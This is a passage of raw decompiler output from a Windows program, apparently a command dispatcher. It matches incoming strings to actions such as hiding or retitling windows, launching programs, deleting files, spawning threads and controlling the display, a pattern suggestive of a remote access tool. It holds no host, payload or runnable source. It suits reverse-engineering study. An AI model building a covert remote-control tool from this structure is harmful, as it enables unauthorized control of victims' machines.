0x476bdc;\n        fcn.00405894();\n        if (uVar10) {\n            var_5d0h = 0x476bf0;\n            fcn.004059a4();\n            var_5d4h = 0x476c18;\n            var_5d8h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_5d8h;\n            var_5dch = 0x5;\n            var_5e0h = 0x476c08;\n            var_5d0h = &stack0xfffffffc;\n            var_5e0h = fcn.00409e54();\n            var_5e4h = 0x476c0e;\n            sub.user32.dll_ShowWindow();\n            uVar10 = 1;\n            *in_FS_OFFSET = var_5e0h;\n        }\n        var_5d8h = &fcn.00472f6c::var_790h;\n        var_5dch = 0x476c3b;\n        fcn.00405964();\n        var_5dch = 0x476c4b;\n        fcn.00405894();\n        if (uVar10) {\n            var_5dch = 0x476c63;\n            fcn.004059a4();\n            var_5e0h = 0x476ce6;\n            var_5e4h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_5e4h;\n            var_5e8h = &fcn.00472f6c::var_b4h;\n            var_5ech = 0x476c85;\n            var_5dch = &stack0xfffffffc;\n            fcn.00405a48();\n            var_5ech = 0x476c95;\n            fcn.00405964();\n            var_5ech = 0x476ca2;\n            fcn.00405a48();\n            var_5ech = 0x476cb1;\n            fcn.004059a4();\n            var_5ech = 0x476cbf;\n            fcn.00405504();\n            var_5ech = 0x476cca;\n            var_5ech = fcn.004058fc();\n            var_5f0h = 0x476cd6;\n            var_5f0h = fcn.00409e54();\n            var_5f4h = 0x476cdc;\n            sub.user32.dll_SetWindowTextA();\n            uVar10 = 1;\n            *in_FS_OFFSET = var_5f0h;\n        }\n        var_5e8h = &fcn.00472f6c::var_794h;\n        var_5ech = 0x476d09;\n        fcn.00405964();\n        var_5ech = 0x476d19;\n        fcn.00405894();\n        if (uVar10) {\n            var_5ech = 0x476d31;\n            fcn.004059a4();\n            var_5f0h = 0x476e3f;\n            var_5f4h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_5f4h;\n            var_5f8h = &fcn.00472f6c::var_1ch;\n            var_5fch = 0x476d50;\n            var_5ech = &stack0xfffffffc;\n            fcn.00405a48();\n            var_5fch = 0x476d60;\n            fcn.00405964();\n            var_5fch = 0x476d6d;\n            fcn.00405a48();\n            var_5fch = 0x476d7c;\n            fcn.004059a4();\n            var_5fch = &fcn.00472f6c::var_20h;\n            var_600h = 0x476d8d;\n            fcn.00405a48();\n            var_600h = 0x476d9d;\n            fcn.00405964();\n            var_600h = 0x476daa;\n            fcn.00405a48();\n            var_600h = 0x476db9;\n            fcn.004059a4();\n            var_600h = 0x476dc4;\n            fcn.00405504();\n            var_600h = 0x14;\n            var_604h = 0x40;\n            var_608h = 0x476dcd;\n            var_610h = sub.kernel32.dll_LocalAlloc_1();\n            var_608h = 0x476ddc;\n            fcn.004895cc();\n            var_608h = 0x476de9;\n            fcn.004054c0();\n            var_608h = 0x476df4;\n            fcn.004054c0();\n            var_608h = 0x476dff;\n            fcn.004054c0();\n            var_608h = 0x476e0a;\n            fcn.004054c0();\n            var_608h = 0x476e17;\n            fcn.004054c0();\n            var_608h = &fcn.00472f6c::var_2b4h;\n            var_60ch = 0;\n            var_614h = fcn.00485178;\n            var_618h = NULL;\n            var_61ch = NULL;\n            var_620h = 0x476e2f;\n            var_620h = sub.kernel32.dll_CreateThread();\n            var_624h = 0x476e35;\n            sub.kernel32.dll_CloseHandle_1();\n            uVar10 = 1;\n            *in_FS_OFFSET = var_620h;\n        }\n        var_618h = &fcn.00472f6c::var_79ch;\n        var_61ch = 0x476e6c;\n        fcn.00405964();\n        var_61ch = 0x476e7c;\n        fcn.00405894();\n        if (uVar10) {\n            var_620h = 0x476eb0;\n            var_624h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_624h;\n            var_628h = 0x476e9e;\n            var_61ch = &stack0xfffffffc;\n            fcn.004059a4();\n            var_628h = 0x476ea6;\n            fcn.00489878();\n            uVar10 = 1;\n            *in_FS_OFFSET = var_624h;\n        }\n        var_61ch = &fcn.00472f6c::var_7a0h;\n        var_620h = 0x476ed3;\n        fcn.00405964();\n        var_620h = 0x476ee3;\n        fcn.00405894();\n        if (uVar10) {\n            var_624h = 0x476f66;\n            var_628h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_628h;\n            var_62ch = 0x476f09;\n            var_620h = &stack0xfffffffc;\n            fcn.004059a4();\n            var_62ch = &fcn.00472f6c::var_1ch;\n            var_630h = 0x476f1a;\n            fcn.00405a48();\n            var_630h = 0x476f2a;\n            fcn.00405964();\n            var_630h = 0x476f37;\n            fcn.00405a48();\n            var_630h = 0x476f46;\n            fcn.004059a4();\n            var_630h = 0x476f51;\n            fcn.00405504();\n            var_630h = 0x476f5c;\n            fcn.0048992c();\n            uVar10 = 1;\n            *in_FS_OFFSET = var_62ch;\n        }\n        var_624h = &fcn.00472f6c::var_7a4h;\n        var_628h = 0x476f89;\n        fcn.00405964();\n        var_628h = 0x476f99;\n        fcn.00405894();\n        if (uVar10) {\n            var_628h = 0x476fad;\n            fcn.004059a4();\n            var_628h = 0x1;\n            var_62ch = NULL;\n            var_630h = 0;\n            var_634h = 0x476fbb;\n            var_634h = fcn.004058fc();\n            var_638h = 0x47bd5c;\n            var_63ch = 0;\n            var_640h = 0x476fc8;\n            sub.shell32.dll_ShellExecuteA();\n        }\n        var_640h = &fcn.00472f6c::var_7a8h;\n        var_644h = 0x476fe1;\n        fcn.00405964();\n        var_644h = 0x476ff1;\n        fcn.00405894();\n        if (uVar10) {\n            var_644h = 0x477009;\n            fcn.004059a4();\n            var_648h = 0x477117;\n            var_64ch = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_64ch;\n            var_650h = &fcn.00472f6c::var_1ch;\n            var_654h = 0x477028;\n            var_644h = &stack0xfffffffc;\n            fcn.00405a48();\n            var_654h = 0x477038;\n            fcn.00405964();\n            var_654h = 0x477045;\n            fcn.00405a48();\n            var_654h = 0x477054;\n            fcn.004059a4();\n            var_654h = &fcn.00472f6c::var_20h;\n            var_658h = 0x477065;\n            fcn.00405a48();\n            var_658h = 0x477075;\n            fcn.00405964();\n            var_658h = 0x477082;\n            fcn.00405a48();\n            var_658h = 0x477091;\n            fcn.004059a4();\n            var_658h = 0x47709c;\n            fcn.00405504();\n            var_658h = 0x14;\n            var_65ch = 0x40;\n            var_660h = 0x4770a5;\n            var_668h = sub.kernel32.dll_LocalAlloc_1();\n            var_660h = 0x4770b4;\n            fcn.004717dc();\n            var_660h = 0x4770c1;\n            fcn.004054c0();\n            var_660h = 0x4770cc;\n            fcn.004054c0();\n            var_660h = 0x4770d7;\n            fcn.004054c0();\n            var_660h = 0x4770e2;\n            fcn.004054c0();\n            var_660h = 0x4770ef;\n            fcn.004054c0();\n            var_660h = &fcn.00472f6c::var_2b4h;\n            var_664h = 0;\n            var_66ch = fcn.00485178;\n            var_670h = NULL;\n            var_674h = NULL;\n            var_678h = 0x477107;\n            var_678h = sub.kernel32.dll_CreateThread();\n            var_67ch = 0x47710d;\n            sub.kernel32.dll_CloseHandle_1();\n            uVar10 = 1;\n            *in_FS_OFFSET = var_678h;\n        }\n        var_670h = &fcn.00472f6c::var_7b0h;\n        var_674h = 0x477144;\n        fcn.00405964();\n        var_674h = 0x477154;\n        fcn.00405894();\n        if (uVar10) {\n            var_674h = 0x477168;\n            fcn.004059a4();\n            var_674h = 0x477173;\n            fcn.00464104();\n            var_674h = 0x477181;\n            fcn.0046445c();\n        }\n        var_674h = &fcn.00472f6c::var_7b8h;\n        var_678h = 0x47719a;\n        fcn.00405964();\n        var_678h = 0x4771aa;\n        fcn.00405894();\n        if (uVar10) {\n            var_678h = 0x4771be;\n            fcn.004059a4();\n            var_678h = 0x4771c9;\n            fcn.00464104();\n            var_678h = 0x4771d7;\n            fcn.00464394();\n        }\n        var_678h = &fcn.00472f6c::var_7c0h;\n        var_67ch = 0x4771f0;\n        fcn.00405964();\n        var_67ch = 0x477200;\n        fcn.00405894();\n        if (uVar10) {\n            var_67ch = 0x477214;\n            fcn.004059a4();\n            var_67ch = 0x47721c;\n            fcn.0047174c();\n        }\n        var_67ch = &fcn.00472f6c::var_7c4h;\n        var_680h = 0x477235;\n        fcn.00405964();\n        var_680h = 0x477245;\n        fcn.00405894();\n        if (uVar10) {\n            var_680h = 0x47725d;\n            fcn.004059a4();\n            var_680h = &fcn.00472f6c::var_bch;\n            var_684h = 0x477271;\n            fcn.00405a48();\n            var_684h = 0x477281;\n            fcn.00405964();\n            var_684h = 0x47728e;\n            fcn.00405a48();\n            var_684h = 0x47729d;\n            fcn.004059a4();\n            var_684h = &fcn.00472f6c::var_c0h;\n            var_688h = 0x4772b1;\n            iVar7 = fcn.00405a48();\n            uVar10 = iVar7 == 1;\n            var_688h = 0x4772c1;\n            fcn.00405964();\n            var_688h = 0x4772ce;\n            fcn.00405a48();\n            var_688h = 0x4772dd;\n            fcn.004059a4();\n            var_688h = 0x4772eb;\n            fcn.00405504();\n            var_688h = 0x4772f6;\n            fcn.004058fc();\n            var_688h = 0x477303;\n            fcn.00405664();\n            var_688h = var_7c8h;\n            var_68ch = 0x477315;\n            var_68ch = fcn.004058fc();\n            var_690h = 0x477321;\n            fcn.004058fc();\n            var_688h = 0x477328;\n            fcn.004719ec();\n        }\n        var_688h = &fcn.00472f6c::var_7cch;\n        var_68ch = 0x477341;\n        fcn.00405964();\n        var_68ch = 0x477351;\n        fcn.00405894();\n        if (uVar10) {\n            var_68ch = 0x477369;\n            fcn.004059a4();\n            var_690h = 0x477477;\n            var_694h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_694h;\n            var_698h = &fcn.00472f6c::var_1ch;\n            var_69ch = 0x477388;\n            var_68ch = &stack0xfffffffc;\n            fcn.00405a48();\n            var_69ch = 0x477398;\n            fcn.00405964();\n            var_69ch = 0x4773a5;\n            fcn.00405a48();\n            var_69ch = 0x4773b4;\n            fcn.004059a4();\n            var_69ch = &fcn.00472f6c::var_20h;\n            var_6a0h = 0x4773c5;\n            fcn.00405a48();\n            var_6a0h = 0x4773d5;\n            fcn.00405964();\n            var_6a0h = 0x4773e2;\n            fcn.00405a48();\n            var_6a0h = 0x4773f1;\n            fcn.004059a4();\n            var_6a0h = 0x4773fc;\n            fcn.00405504();\n            var_6a0h = 0x14;\n            var_6a4h = 0x40;\n            var_6a8h = 0x477405;\n            var_6b0h = sub.kernel32.dll_LocalAlloc_1();\n            var_6a8h = 0x477414;\n            fcn.004664a8();\n            var_6a8h = 0x477421;\n            fcn.004054c0();\n            var_6a8h = 0x47742c;\n            fcn.004054c0();\n            var_6a8h = 0x477437;\n            fcn.004054c0();\n            var_6a8h = 0x477442;\n            fcn.004054c0();\n            var_6a8h = 0x47744f;\n            fcn.004054c0();\n            var_6a8h = &fcn.00472f6c::var_2b4h;\n            var_6ach = 0;\n            var_6b4h = fcn.00485178;\n            var_6b8h = NULL;\n            var_6bch = NULL;\n            var_6c0h = 0x477467;\n            var_6c0h = sub.kernel32.dll_CreateThread();\n            var_6c4h = 0x47746d;\n            sub.kernel32.dll_CloseHandle_1();\n            uVar10 = 1;\n            *in_FS_OFFSET = var_6c0h;\n        }\n        var_6b8h = &fcn.00472f6c::var_7d4h;\n        var_6bch = 0x4774a4;\n        fcn.00405964();\n        var_6bch = 0x4774b4;\n        fcn.00405894();\n        if (uVar10) {\n            var_6bch = 0x4774cc;\n            fcn.004059a4();\n            var_6bch = &fcn.00472f6c::var_c8h;\n            var_6c0h = 0x4774e0;\n            iVar7 = fcn.00405a48();\n            uVar10 = iVar7 == 1;\n            var_6c0h = 0x4774f0;\n            fcn.00405964();\n            var_6c0h = 0x4774fd;\n            fcn.00405a48();\n            var_6c0h = 0x47750c;\n            fcn.004059a4();\n            var_6c0h = 0x47751a;\n            fcn.00405504();\n            var_6c0h = 0x47752b;\n            fcn.00405504();\n            var_6c0h = 0x477540;\n            fcn.004059a4();\n            var_6c0h = &fcn.00472f6c::var_c8h;\n            var_6c4h = 0x47755c;\n            fcn.00405964();\n            var_6c4h = 0x47cbf4;\n            var_6c8h = var_d0h;\n            var_6cch = 0x47cbf4;\n            var_6d0h = 0x47757c;\n            fcn.00405800();\n            var_6d0h = 0x477593;\n            fcn.00466c74();\n        }\n        var_6d0h = 0x4775a0;\n        fcn.00405894();\n        if (uVar10) {\n            var_6d0h = 0x4775a7;\n            fcn.00466d50();\n        }\n        var_6d0h = &fcn.00472f6c::var_7dch;\n        var_6d4h = 0x4775c0;\n        fcn.00405964();\n        var_6d4h = 0x4775d0;\n        fcn.00405894();\n        if (uVar10) {\n            var_6d4h = 0x4775e8;\n            fcn.004059a4();\n            var_6d4h = &fcn.00472f6c::var_c8h;\n            var_6d8h = 0x4775fc;\n            fcn.00405a48();\n            var_6d8h = 0x47760c;\n            fcn.00405964();\n            var_6d8h = 0x477619;\n            fcn.00405a48();\n            var_6d8h = 0x477628;\n            fcn.004059a4();\n            var_6d8h = &fcn.00472f6c::var_cch;\n            var_6dch = 0x47763c;\n            iVar7 = fcn.00405a48();\n            uVar10 = iVar7 == 1;\n            var_6dch = 0x47764c;\n            fcn.00405964();\n            var_6dch = 0x477659;\n            fcn.00405a48();\n            var_6dch = 0x477668;\n            fcn.004059a4();\n            var_6dch = var_cch;\n            var_6e0h = 0x477682;\n            fcn.00482454(var_cch);\n        }\n        var_6e0h = 0x47768f;\n        fcn.00405894();\n        if (uVar10) {\n            var_6e4h = 0x4776cc;\n            var_6e8h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_6e8h;\n            var_6ech = 0x2;\n            var_6f0h = 0x4776b1;\n            var_6e0h = &stack0xfffffffc;\n            fcn.0045def4();\n            var_6f0h = var_7e0h;\n            var_6f4h = 0x4776bd;\n            (**(*var_7e0h + 0x74))();\n            var_6ech = 0x4776c2;\n            fcn.00407208();\n            uVar10 = 1;\n            *in_FS_OFFSET = var_6e8h;\n        }\n        var_6e0h = 0x4776e3;\n        fcn.00405894();\n        if (uVar10) {\n            var_6e4h = 0x477720;\n            var_6e8h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_6e8h;\n            var_6ech = 0xa;\n            var_6f0h = 0x477705;\n            var_6e0h = &stack0xfffffffc;\n            fcn.0045def4();\n            var_6f0h = var_7e4h;\n            var_6f4h = 0x477711;\n            (**(*var_7e4h + 0x74))();\n            var_6ech = 0x477716;\n            fcn.00407208();\n            uVar10 = 1;\n            *in_FS_OFFSET = var_6e8h;\n        }\n        var_6e0h = 0x477737;\n        fcn.00405894();\n        if (uVar10) {\n            var_6e4h = 0x477774;\n            var_6e8h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_6e8h;\n            var_6ech = 0x22;\n            var_6f0h = 0x477759;\n            var_6e0h = &stack0xfffffffc;\n            fcn.0045def4();\n            var_6f0h = var_7e8h;\n            var_6f4h = 0x477765;\n            (**(*var_7e8h + 0x74))();\n            var_6ech = 0x47776a;\n            fcn.00407208();\n            uVar10 = 1;\n            *in_FS_OFFSET = var_6e8h;\n        }\n        var_6e0h = 0x47778b;\n        fcn.00405894();\n        if (uVar10) {\n            var_6e4h = 0x4777c8;\n            var_6e8h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_6e8h;\n            var_6ech = 0x1;\n            var_6f0h = 0x4777ad;\n            var_6e0h = &stack0xfffffffc;\n            fcn.0045def4();\n            var_6f0h = var_7ech;\n            var_6f4h = 0x4777b9;\n            (**(*var_7ech + 0x74))();\n            var_6ech = 0x4777be;\n            fcn.00407208();\n            uVar10 = 1;\n            *in_FS_OFFSET = var_6e8h;\n        }\n        var_6e0h = 0x4777df;\n        fcn.00405894();\n        if (uVar10) {\n            var_6e4h = 0x47781a;\n            var_6e8h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_6e8h;\n            var_6ech = 0x4777ff;\n            var_6e0h = &stack0xfffffffc;\n            fcn.0045def4();\n            var_6ech = var_7f0h;\n            var_6f0h = 0x47780b;\n            (**(*var_7f0h + 0x3c))();\n            var_6ech = 0x477810;\n            fcn.00407208();\n            uVar10 = 1;\n            *in_FS_OFFSET = var_6e8h;\n        }\n        var_6e0h = 0x477831;\n        fcn.00405894();\n        if (uVar10) {\n            var_6e4h = 0x477890;\n            var_6e8h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_6e8h;\n            var_6ech = 0x477850;\n            var_6e0h = &stack0xfffffffc;\n            var_6ech = fcn.00405c48();\n            var_6f0h = 0x477861;\n            fcn.0045def4();\n            var_6f0h = var_7f8h;\n            var_6f4h = 0x477870;\n            (**(*var_7f8h + 0x90))();\n            var_6f4h = 0x477875;\n            fcn.00407208();\n            var_6f4h = 0x477886;\n            fcn.004056f4();\n            *in_FS_OFFSET = var_6f0h;\n            var_6ech = 0x4778f0;\n            var_6f0h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_6f0h;\n            var_6f4h = 0x4778b3;\n            var_6e8h = &stack0xfffffffc;\n            var_6f4h = fcn.00405c48();\n            var_6f8h = 0x4778c4;\n            fcn.0045def4();\n            var_6f8h = var_800h;\n            var_6fch = 0x4778d0;\n            (**(*var_800h + 0x24))();\n            var_6fch = 0x4778d5;\n            fcn.00407208();\n            var_6fch = 0x4778e6;\n            fcn.004056f4();\n            *in_FS_OFFSET = var_6f8h;\n            var_6f4h = 0x477959;\n            var_6f8h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_6f8h;\n            var_6fch = 0x47790d;\n            var_6f0h = &stack0xfffffffc;\n            cVar1 = fcn.00466e38();\n            if (cVar1 == '\\x01') {\n                var_6fch = 0x47791c;\n                var_6fch = fcn.00405c48();\n                var_700h = 0x47792d;\n                fcn.0045def4();\n                var_700h = var_808h;\n                var_704h = 0x477939;\n                (**(*var_808h + 0x6c))();\n                var_6fch = 0x47793e;\n                fcn.00407208();\n                var_6fch = 0x47794f;\n                fcn.004056f4();\n            }\n            *in_FS_OFFSET = var_6f8h;\n            var_6f4h = 0x4779c2;\n            var_6f8h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_6f8h;\n            var_6fch = 0x477976;\n            var_6f0h = &stack0xfffffffc;\n            cVar1 = fcn.00466e38();\n            if (cVar1 == '\\x01') {\n                var_6fch = 0x477985;\n                var_6fch = fcn.00405c48();\n                var_700h = 0x477996;\n                fcn.0045def4();\n                var_700h = var_810h;\n                var_704h = 0x4779a2;\n                (**(*var_810h + 0x70))();\n                var_6fch = 0x4779a7;\n                fcn.00407208();\n                var_6fch = 0x4779b8;\n                fcn.004056f4();\n            }\n            *in_FS_OFFSET = var_6f8h;\n            var_6f4h = 0x477a25;\n            var_6f8h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_6f8h;\n            var_6fch = 0x4779e5;\n            var_6f0h = &stack0xfffffffc;\n            var_6fch = fcn.00405c48();\n            var_700h = 0x4779f6;\n            fcn.0045def4();\n            var_700h = var_818h;\n            var_704h = 0x477a05;\n            (**(*var_818h + 0x80))();\n            var_6bch = 0x477a0a;\n            fcn.00407208();\n            var_6bch = 0x477a1b;\n            fcn.004056f4();\n            *in_FS_OFFSET = var_6b8h;\n            if (var_d4h == NULL) {\n                var_6b0h = 0x477a48;\n                fcn.00405504();\n            }\n            if (var_d8h == NULL) {\n                var_6b0h = 0x477a61;\n                fcn.00405504();\n            }\n            if (var_dch == NULL) {\n                var_6b0h = 0x477a7a;\n                fcn.00405504();\n            }\n            if (var_e0h == NULL) {\n                var_6b0h = 0x477a93;\n                fcn.00405504();\n            }\n            uVar10 = var_e4h == NULL;\n            if (uVar10) {\n                var_6b0h = 0x477aac;\n                fcn.00405504();\n            }\n            var_6b0h = 0x47cca8;\n            var_6b4h = var_d4h;\n            var_6b8h = 0x47bbe4;\n            var_6bch = var_d8h;\n            var_6c0h = 0x47bbe4;\n            var_6c4h = var_dch;\n            var_6c8h = 0x47bbe4;\n            var_6cch = var_e0h;\n            var_6d0h = 0x47bbe4;\n            var_6d4h = var_e4h;\n            var_6d8h = 0x47bbe4;\n            var_6dch = 0x477af3;\n            fcn.00466ed4();\n            var_6dch = var_820h;\n            var_6e0h = 0x477b09;\n            fcn.00405800();\n            var_6e0h = 0x477b14;\n            fcn.00472b58();\n        }\n        var_6e0h = &fcn.00472f6c::var_824h;\n        var_6e4h = 0x477b2d;\n        fcn.00405964();\n        var_6e4h = 0x477b3d;\n        fcn.00405894();\n        if (uVar10) {\n            var_6e4h = 0x477b55;\n            fcn.004059a4();\n            var_6e8h = 0x477c63;\n            var_6ech = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_6ech;\n            var_6f0h = &fcn.00472f6c::var_1ch;\n            var_6f4h = 0x477b74;\n            var_6e4h = &stack0xfffffffc;\n            fcn.00405a48();\n            var_6f4h = 0x477b84;\n            fcn.00405964();\n            var_6f4h = 0x477b91;\n            fcn.00405a48();\n            var_6f4h = 0x477ba0;\n            fcn.004059a4();\n            var_6f4h = &fcn.00472f6c::var_20h;\n            var_6f8h = 0x477bb1;\n            fcn.00405a48();\n            var_6f8h = 0x477bc1;\n            fcn.00405964();\n            var_6f8h = 0x477bce;\n            fcn.00405a48();\n            var_6f8h = 0x477bdd;\n            fcn.004059a4();\n            var_6f8h = 0x477be8;\n            fcn.00405504();\n            var_6f8h = 0x14;\n            var_6fch = 0x40;\n            var_700h = 0x477bf1;\n            var_708h = sub.kernel32.dll_LocalAlloc_1();\n            var_700h = 0x477c00;\n            fcn.00467158();\n            var_700h = 0x477c0d;\n            fcn.004054c0();\n            var_700h = 0x477c18;\n            fcn.004054c0();\n            var_700h = 0x477c23;\n            fcn.004054c0();\n            var_700h = 0x477c2e;\n            fcn.004054c0();\n            var_700h = 0x477c3b;\n            fcn.004054c0();\n            var_700h = &fcn.00472f6c::var_2b4h;\n            var_704h = 0;\n            var_70ch = fcn.00485178;\n            var_710h = NULL;\n            var_714h = NULL;\n            var_718h = 0x477c53;\n            var_718h = sub.kernel32.dll_CreateThread();\n            var_71ch = 0x477c59;\n            sub.kernel32.dll_CloseHandle_1();\n            uVar10 = 1;\n            *in_FS_OFFSET = var_718h;\n        }\n        var_710h = &fcn.00472f6c::var_82ch;\n        var_714h = 0x477c90;\n        fcn.00405964();\n        var_714h = 0x477ca0;\n        fcn.00405894();\n        if (uVar10) {\n            var_714h = 0x477cb4;\n            fcn.004059a4();\n            var_714h = 0x477cb9;\n            cVar1 = fcn.00466e38();\n            uVar10 = cVar1 == '\\x01';\n            if (uVar10) {\n                var_714h = 0x477cc5;\n                fcn.004674e0();\n            }\n        }\n        var_714h = &fcn.00472f6c::var_830h;\n        var_718h = 0x477cde;\n        fcn.00405964();\n        var_718h = 0x477cee;\n        fcn.00405894();\n        if (uVar10) {\n            var_718h = 0x477d02;\n            fcn.004059a4();\n            var_718h = 0x477d07;\n            cVar1 = fcn.00466e38();\n            uVar10 = cVar1 == '\\x01';\n            if (uVar10) {\n                var_718h = 0x477d13;\n                fcn.004670d8();\n            }\n        }\n        var_718h = &fcn.00472f6c::var_834h;\n        var_71ch = 0x477d2c;\n        fcn.00405964();\n        var_71ch = 0x477d3c;\n        fcn.00405894();\n        if (uVar10) {\n            var_71ch = 0x477d50;\n            fcn.004059a4();\n            var_71ch = 0x477d55;\n            cVar1 = fcn.00466e38();\n            uVar10 = cVar1 == '\\x01';\n            if (uVar10) {\n                var_71ch = 0x477d61;\n                fcn.0046762c();\n            }\n        }\n        var_71ch = &fcn.00472f6c::var_838h;\n        var_720h = 0x477d7a;\n        fcn.00405964();\n        var_720h = 0x477d8a;\n        fcn.00405894();\n        if (uVar10) {\n            var_720h = 0x477d9e;\n            fcn.004059a4();\n            var_720h = 0x477da3;\n            cVar1 = fcn.00466e38();\n            uVar10 = cVar1 == '\\x01';\n            if (uVar10) {\n                var_720h = 0x477daf;\n                fcn.00467778();\n            }\n        }\n        var_720h = &fcn.00472f6c::var_83ch;\n        var_724h = 0x477dc8;\n        fcn.00405964();\n        var_724h = 0x477dd8;\n        fcn.00405894();\n        if (uVar10) {\n            var_724h = 0x477dec;\n            fcn.004059a4();\n            *0x49882c = 1;\n            var_724h = 0x498848;\n            var_728h = 0x477e08;\n            iVar7 = fcn.00405a48();\n            uVar10 = iVar7 == 1;\n            var_728h = 0x477e18;\n            fcn.00405964();\n            var_728h = 0x477e25;\n            fcn.00405a48();\n            var_728h = 0x477e34;\n            fcn.004059a4();\n            var_728h = 0x477e41;\n            fcn.004054c0();\n        }\n        var_728h = 0x477e4e;\n        fcn.00405894();\n        if (uVar10) {\n            uVar10 = 1;\n            *0x49882c = 0;\n        }\n        var_728h = 0x477e64;\n        fcn.00405894();\n        if ((uVar10) && (uVar10 = *0x498830 == 1,  uVar10)) {\n            var_728h = 0x477e79;\n            fcn.00472b58();\n        }\n        var_728h = 0x477e86;\n        fcn.00405894();\n        if ((uVar10) && (uVar10 = *0x498830 == 1,  !uVar10)) {\n            var_728h = 0x498818;\n            var_72ch = NULL;\n            var_730h = 0;\n            var_734h = 0x480a14;\n            var_738h = NULL;\n            var_73ch = NULL;\n            var_740h = 0x477ea8;\n            sub.kernel32.dll_CreateThread();\n            *0x498830 = 1;\n        }\n        var_728h = 0x477ebf;\n        fcn.00405894();\n        if (uVar10) {\n            uVar10 = 1;\n            *0x498830 = 0;\n        }\n        var_728h = 0x477ed5;\n        fcn.00405894();\n        if (uVar10) {\n            *0x49882c = 1;\n        }\n        var_728h = 0x477eee;\n        fcn.00405894();\n        if (uVar10) {\n            uVar10 = 1;\n            *0x49882c = 0;\n        }\n        var_728h = &fcn.00472f6c::var_840h;\n        var_72ch = 0x477f10;\n        fcn.00405964();\n        var_72ch = 0x477f20;\n        fcn.00405894();\n        if (uVar10) {\n            var_72ch = 0x477f38;\n            fcn.004059a4();\n            var_730h = 0x47808a;\n            var_734h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_734h;\n            var_738h = 0x477f51;\n            var_72ch = &stack0xfffffffc;\n            fcn.00463d78();\n            var_738h = 0x477f61;\n            fcn.00405738();\n            var_738h = 0x477f6c;\n            cVar1 = fcn.0040a1e4();\n            if (cVar1 == '\\0') {\n                *in_FS_OFFSET = var_734h;\n                *in_FS_OFFSET = var_728h;\n                goto code_r0x0047ba11;\n            }\n            var_738h = &fcn.00472f6c::var_1ch;\n            var_73ch = 0x477f96;\n            fcn.00405a48();\n            var_73ch = 0x477fa6;\n            fcn.00405964();\n            var_73ch = 0x477fb3;\n            fcn.00405a48();\n            var_73ch = 0x477fc2;\n            fcn.004059a4();\n            var_73ch = &fcn.00472f6c::var_20h;\n            var_740h = 0x477fd3;\n            fcn.00405a48();\n            var_740h = 0x477fe3;\n            fcn.00405964();\n            var_740h = 0x477ff0;\n            fcn.00405a48();\n            var_740h = 0x477fff;\n            fcn.004059a4();\n            var_740h = 0x47800a;\n            fcn.00405504();\n            var_740h = 0x14;\n            var_744h = 0x40;\n            var_748h = 0x478013;\n            var_750h = sub.kernel32.dll_LocalAlloc_1();\n            var_748h = 0x478022;\n            fcn.00463d78();\n            var_748h = 0x478034;\n            fcn.00405784();\n            var_748h = 0x47803f;\n            fcn.004054c0();\n            var_748h = 0x47804a;\n            fcn.004054c0();\n            var_748h = 0x478055;\n            fcn.004054c0();\n            var_748h = 0x478062;\n            fcn.004054c0();\n            var_748h = &fcn.00472f6c::var_2b4h;\n            var_74ch = 0;\n            var_754h = fcn.00482d30;\n            var_758h = NULL;\n            var_75ch = NULL;\n            var_760h = 0x47807a;\n            var_760h = sub.kernel32.dll_CreateThread();\n            var_764h = 0x478080;\n            sub.kernel32.dll_CloseHandle_1();\n            uVar10 = 1;\n            *in_FS_OFFSET = var_760h;\n        }\n        var_758h = 0x4780ab;\n        fcn.00405894();\n        if (uVar10) {\n            var_75ch = 0x478137;\n            var_760h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_760h;\n            var_764h = 0x4780ca;\n            var_758h = &stack0xfffffffc;\n            fcn.00463d78();\n            var_764h = 0x4780da;\n            fcn.00405738();\n            var_764h = 0x4780e5;\n            cVar1 = fcn.0040a1e4();\n            if (cVar1 != '\\0') {\n                var_764h = 0x4780f4;\n                fcn.00463d78();\n                var_764h = 0x478104;\n                fcn.00405738();\n                var_350h = var_850h;\n                var_764h = 0x47811b;\n                var_764h = fcn.004058fc();\n                lParam = 0x478121;\n                iVar7 = sub.kernel32.dll_DeleteFileA();\n                piStack856 = piStack856 & 0xffffff | 1 - (iVar7 == 0) << 0x18;\n            }\n            uVar10 = 1;\n            *in_FS_OFFSET = var_760h;\n        }\n        var_758h = 0x47814e;\n        fcn.00405894();\n        if (uVar10) {\n            var_758h = 0x47815a;\n            fcn.00488ea4();\n        }\n        var_758h = 0x478167;\n        fcn.00405894();\n        if (uVar10) {\n            var_758h = 0x478173;\n            fcn.00488ea4();\n        }\n        var_758h = 0x478180;\n        fcn.00405894();\n        if (uVar10) {\n            var_758h = 0x47818c;\n            fcn.00488ea4();\n        }\n        var_758h = 0x478199;\n        fcn.00405894();\n        if (uVar10) {\n            var_758h = 0x4781a5;\n            fcn.00488ea4();\n        }\n        var_758h = 0x4781b2;\n        fcn.00405894();\n        if (uVar10) {\n            var_758h = NULL;\n            var_75ch = 0xf140;\n            var_760h = 0x112;\n            var_764h = NULL;\n            lParam = 0x4781c7;\n            sub.user32.dll_SendMessageA();\n        }\n        var_758h = 0x4781d4;\n        fcn.00405894();\n        if (uVar10) {\n            var_758h = 0x4781db;\n            